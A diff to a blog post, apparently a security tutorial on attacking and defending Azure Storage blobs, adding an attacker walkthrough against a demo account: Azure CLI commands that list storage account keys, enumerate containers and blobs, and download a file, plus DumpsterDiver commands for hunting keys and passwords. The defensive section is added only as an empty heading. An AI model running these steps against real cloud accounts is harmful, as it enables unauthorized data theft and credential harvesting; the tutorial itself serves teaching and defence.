@@ -154,13 +154,42 @@ gobuster dir -u bonzibuddy.blob.core.windows.net -w /usr/share/wordlists/dirb/bi
 
             <h3 id="Enumerating-AZCLI">Enumerating the Target</h3>
             <p>Let's imagine we have access to a tool like Azure CLI and want to blend in with the environment a bit more.</p>
-            <p>Using the Azure CLI, we can list all the containers in a storage account with the following command:</p>
-            
+            <p>Using the Azure CLI, we can list storage accounts:</p>
+            <pre><code>az storage account list</code></pre>
+            <p>The key associated with a storage account: </p>
+            <pre><code>az storage account keys list --account-name bonzibuddy</code></pre>
+            <p>And then we can list the containers in the storage account:</p>
+            <pre><code>az storage container list --account-name bonzibuddy --account-key {key}</code></pre>
+            <p>And finally, list the blobs in the container:</p>
+            <pre><code>az storage blob list --account-name bonzibuddy --account-key {key} --container-name peedy-pictures</code></pre>
 
+            <video controls>
+                <source src="https://kogatana-x.github.io/images/Attacking-and-Defending-Azure-Storage-Blobs/4-Enumerating-Blob-Azure-CLI.mp4" type="video/mp4">
+                This would be a video, if your browser supported it.
+            </video>
+            <h3 id="Exfiltration">Complete the Mission</h3>
+            <p>Now that we identified the container name and blob to target, we can now complete our mission!</p>
+            <p>Using the Azure CLI, we can download the blob to our local machine:</p>
+            <pre><code>az storage blob download --account-name bonzibuddy --account-key {key} --container-name peedy-pictures --name flexing.png --file flexing.png</code></pre>
+            <p>Using a tool like Microburst, we could do the same thing: </p>
+            <pre><code>Invoke-WebRequest –Uri https://storageaccount.blob.core.windows.net/peedy-pictures/flexing.png –OutFile flexing.png</code></pre>
+            <p>If we had downloaded a bunch of bulk data, we can use a tool like DumpsterDiver to find some more juicy bits like keys and sensitive information.</p>
+            <pre><code>DumpsterDiver.py -p [PATH_TO_FOLDER] --min-key 66 --max-key 66 --entropy 5.1
+DumpsterDiver.py -p [PATH_TO_FOLDER] --min-pass 10 --max-pass 15 --pass-complex 8</code></pre>
+            <p>There is also always good ole grep ;)</p>
 
+            <p>And that's it! That is all an attacker needs to do to "attack" an Azure Storage Blob. </p>
+            <video controls>
+                <source src="https://kogatana-x.github.io/images/Attacking-and-Defending-Azure-Storage-Blobs/5-Hackinggg.mp4" type="video/mp4">
+                This would be a video, if your browser supported it.
+            </video>
 
             <pre>
 ──────────────────────────────────────────────────────────────────────────────────</pre>
+            <h2 id="Defending-Azure-Storage-Blobs">Defending Azure Storage Blobs</h2>
+            <p>Now that we know how an attacker can target Azure Storage Blobs, we can now discuss how to defend against these attacks.</p>
+            
+
         </div>
     </div>
     <div class="footer">
